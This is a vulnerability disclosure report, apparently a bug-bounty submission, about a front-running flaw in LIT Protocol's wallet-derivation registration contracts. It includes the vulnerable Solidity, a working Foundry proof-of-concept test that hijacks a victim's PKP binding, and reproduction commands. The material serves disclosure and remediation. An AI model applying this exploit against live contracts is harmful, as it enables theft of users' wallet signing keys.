# Vulnerability Report: Derivation-path front-running permanently hijacks PKP wallet-signing authority and signing key leak

## Target

- **Component:** Smart contracts — AccountConfig facets
- **File / function (as reviewed):**
  - `.../AccountConfigFacets/WritesFacet.sol` — `registerWalletDerivation(uint256 apiKeyHash, address pkpId, uint256 derivationPath, string name, string description)`
  - `.../AccountConfigFacets/WritesFacet.sol` — `removeWalletDerivation(uint256 apiKeyHash, address pkpId)`
  - `.../AccountConfigFacets/ViewsFacet.sol` — `getWalletDerivation(uint256 apiKeyHash, address walletAddress)`
  - `.../AccountConfigFacets/AppStorage.sol` — `pathToOwnerMaster` / `pkpIdToOwnerMaster` mappings, `WALLET_PATH_TAG`
  - `lit-api-server/src/...` — `get_private_key` (Rust), which calls `get_verified_client_key` to resolve the on-chain registration and release key material
  - Repo: `LIT-Protocol/chipotle`, contracts under `lit-api-server/blockchain/lit_node_express/contracts/AccountConfigFacets/`
- **Reproduction context:** `<<< commit hash; e9d7e299bda0700da5424287f7c4185d0143c4eb  >>>`

## Summary

`registerWalletDerivation` binds a node-issued `derivationPath` to whichever account's master hash calls it **first**, with no check that the caller was the party the node actually issued that path to. Because the path is visible in any pending transaction's calldata before it's mined, an attacker can observe a legitimate user's registration transaction in the mempool, copy the `derivationPath` verbatim, and submit their own call with a higher gas price. Their transaction binds `pathToOwnerMaster[derivationPath]` to the attacker's account; the victim's original transaction then reverts permanently, because this binding is never cleared — including by `removeWalletDerivation`, by design.

## Security impact

**Confirmed against the real node source (`lit-api-server`, Rust — `get_private_key` / `get_verified_client_key`)**

- `get_private_key`'s own comment states: *"get_verified_client_key resolves the path AND verifies the derived key's address matches pkp_id, so an aliased (pkpId, path) registration can't exfiltrate another wallet's key."* This defends against an attacker registering a **mismatched** pair (a real path alongside a fake/different address) — it does **not** defend against an attacker who registers the victim's **genuine, correctly-matched** `(pkpId, derivationPath)` pair under a different account.
- The victim's pending `registerWalletDerivation` transaction contains both values — `pkpId` (their real wallet address) and `derivationPath` — in its calldata, visible to anyone watching the mempool before it's mined. An attacker copies **both values verbatim** and front-runs with higher gas, registering the identical, genuinely-matched pair under their own account.
- Because it is the real pair, `get_verified_client_key`'s address↔path consistency check passes — it was never checking *which account* owns the binding, only that the address and path cryptographically correspond. The attacker's call to `get_private_key` for that `pkpId` **succeeds and returns the victim's real private key material.**
- The victim's legitimate registration for that pair is permanently blocked (`InvalidRequest("PKP owned by another account")`, reverting on the pkpId-ownership check before the path check is even reached), with no recovery path, since neither `pkpIdToOwnerMaster` nor `pathToOwnerMaster` is ever cleared — not even by `removeWalletDerivation`.
- **Scope note:** `refuse_account_admin_wallet` blocks `get_private_key` specifically when the requested address is the account's own admin or billing wallet (the "Account Master Wallet"). The attack therefore does not apply to that one specific wallet, but does apply to any ordinary additional PKP created via `create_wallet` — the common case for actual usage.

Net effect: full compromise of a targeted user's wallet-signing key, confirmed against the real node's own verification logic, contingent only on the attacker observing the victim's registration transaction before it's mined (a standard mempool front-running precondition, not a special access requirement).

## Vulnerable Code

```solidity
// WritesFacet.registerWalletDerivation
uint256 existingPathOwner = s.pathToOwnerMaster[derivationPath];
if (existingPathOwner == 0) {
    if (derivationPath >> AppStorage.WALLET_PATH_TAG_SHIFT != AppStorage.WALLET_PATH_TAG) {
        revert AppStorage.InvalidRequest("invalid wallet derivation path tag");
    }
    s.pathToOwnerMaster[derivationPath] = masterHash;   // <-- first caller wins
} else if (existingPathOwner != masterHash) {
    revert AppStorage.InvalidRequest("derivation path owned by another account");
}
```

The only gate on claiming an unbound path is the `WALLET_PATH_TAG` prefix check. That check is satisfied trivially when the attacker reuses a path that was *already* correctly tagged by the node for the victim — no forgery is needed. Nothing ties `pkpId` (the address label chosen by the caller) to the `derivationPath` cryptographically; the binding is pure "first transaction to land" bookkeeping, and Ethereum transaction ordering (mempool visibility + gas price) is attacker-controllable.

## Proof of Concept

Full runnable Foundry project (real, unmodified `AppStorage.sol`, `WritesFacet.sol`, `ViewsFacet.sol`, `SecurityLib.sol`, `LibDiamond.sol`, `IDiamondCut.sol`) Core test:

```solidity
// test/PathFrontRun.t.sol (excerpt)
// NOTE: attacker reuses the victim's REAL pkpId verbatim (not a distinct
// attacker-chosen address) -- required to pass the node's address<->path
// consistency check. See "Node-side verification" above.
function test_AttackerFrontRunsVictimPathRegistration() public {
    vm.prank(victim);
    h.newChainSecuredAccount("victim", "victim account");

    vm.prank(attacker);
    h.newChainSecuredAccount("attacker", "attacker account");

    uint256 victimMaster = uint256(keccak256(abi.encodePacked(victim)));
    uint256 attackerMaster = uint256(keccak256(abi.encodePacked(attacker)));

    // Attacker copies BOTH victimPkp and victimPath straight out of the
    // mempool and registers the exact, genuinely-matched pair under their
    // OWN account.
    vm.prank(attacker);
    h.registerWalletDerivation(attackerMaster, victimPkp, victimPath, "stolen", "stolen");

    // Victim's original tx now reverts. Permanently.
    vm.prank(victim);
    vm.expectRevert(abi.encodeWithSelector(
        AppStorage.InvalidRequest.selector,
        "PKP owned by another account"
    ));
    h.registerWalletDerivation(victimMaster, victimPkp, victimPath, "mine", "mine");

    // Attacker's account now resolves the victim's exact (pkpId, path) pair
    // through the exact view the node uses before signing/decrypting.
    vm.prank(attacker);
    uint256 resolved = h.getWalletDerivation(attackerMaster, victimPkp);
    assertEq(resolved, victimPath);

    // Removing and re-registering does not return it to the victim.
    vm.prank(attacker);
    h.removeWalletDerivation(attackerMaster, victimPkp);

    vm.prank(victim);
    vm.expectRevert(abi.encodeWithSelector(
        AppStorage.InvalidRequest.selector,
        "PKP owned by another account"
    ));
    h.registerWalletDerivation(victimMaster, victimPkp, victimPath, "mine again", "mine again");
}
```

## Reproduction steps

```bash
# 1. clone the POC github
git clone https://github.com/johnberchy/Lit_protocol_poc.git

# 2. forge install requires a git repo.
git init && git add -A && git commit -m "init" --allow-empty

# 3. Install dependencies.
forge install foundry-rs/forge-std --no-commit
forge install OpenZeppelin/openzeppelin-contracts@v5.4.0 --no-commit

# 4. Pin OpenZeppelin to the exact v5.4.0 TAG, not whatever branch
#    head forge install may otherwise resolve to — a later point
#    release can require a newer solc than this project's pinned
#    `pragma solidity =0.8.28`, causing a
#    "No compiler version exists that matches ^0.8.31"-style error.
(cd lib/openzeppelin-contracts && git fetch --tags && git checkout v5.4.0)

# 5. Sanity check: confirm every local import in the project
#    resolves to a real file before compiling (catches stale/missing
#    files early rather than via a confusing solc error).
for f in $(find src test -name "*.sol"); do
  dir=$(dirname "$f")
  grep -oP '(?<=from ")\./[^"]+\.sol|(?<=from ")\.\./[^"]+\.sol' "$f" | while read imp; do
    [ -f "$(realpath -m "$dir/$imp")" ] || echo "MISSING: $f -> $imp"
  done
done
# (no output = every import resolved)

# 6. Build and run. foundry.toml already sets via_ir = true plus the
#    optimizer — WritesFacet.sol's larger functions (e.g.
#    setUsageApiKey) hit a "stack too deep" error under the legacy
#    codegen pipeline; via-IR is the standard Foundry fix, not a
#    PoC-specific workaround.
forge build
forge test -vvv
```

Expected result: `test_AttackerFrontRunsVictimPathRegistration` passes, demonstrating the full sequence above end-to-end against the real `AppStorage`/`WritesFacet`/`ViewsFacet`/`SecurityLib`/`LibDiamond`/`IDiamondCut` source.

<<< Ran 1 test for test/PathFrontRun.sol:PathFrontRunPoC
[PASS] test_AttackerFrontRunsVictimPathRegistration() (gas: 1016503)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.69ms (1.84ms CPU time) >>>

## Tools Used(Methodology)

AI scan with Kann audits

Manually Reviewed after scan

## Recommendation

- Require that `registerWalletDerivation` only be callable in a way that proves the caller was the intended recipient of `derivationPath` — e.g., a signature from the node/KMS attesting `(path, intended pkpId, intended account)`, checked on-chain before binding `pathToOwnerMaster`.
- Alternatively, make the tag check cryptographically bind the path to the registering account (e.g., incorporate the registering master hash into the path derivation itself, rather than a fixed static prefix), so a copied path cannot be rebound to a different account.


# Lit_protocol_poc
